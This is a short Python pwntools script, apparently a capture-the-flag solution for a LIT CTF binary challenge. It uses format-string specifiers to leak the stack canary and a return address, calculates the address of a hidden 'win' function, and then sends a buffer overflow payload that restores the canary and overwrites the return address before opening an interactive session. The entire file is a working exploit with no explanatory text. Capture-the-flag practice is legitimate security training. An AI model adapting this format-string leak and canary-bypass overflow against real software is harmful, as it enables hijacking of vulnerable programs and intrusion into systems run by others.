#!/usr/bin/env python3

from pwn import *

if args.REMOTE:
    r = remote('litctf.org', 31791)
elif args.GDB:
    r = gdb.debug('./s', 'b vuln')
else:
    r = process('./s')

canary_ptr = b'%11$p'
base_ptr = b'%13$p'

main_fn_offset = 0x0000000000001274
win_fn_offset = 0x00000000000011e9

leak_payload = canary_ptr + b' ' + base_ptr

r.sendline(leak_payload)

data = r.recv().strip().split()

canary = int(data[0], 16)
main_ret = int(data[1], 16)
win_fn = main_ret - (main_fn_offset - win_fn_offset) - 58 + 5

print('canary:', hex(canary))
print('win function:', hex(win_fn))

payload = b'A' * 40 + p64(canary) + b'B' * 8 + p64(win_fn)

r.sendline(payload)

r.interactive()
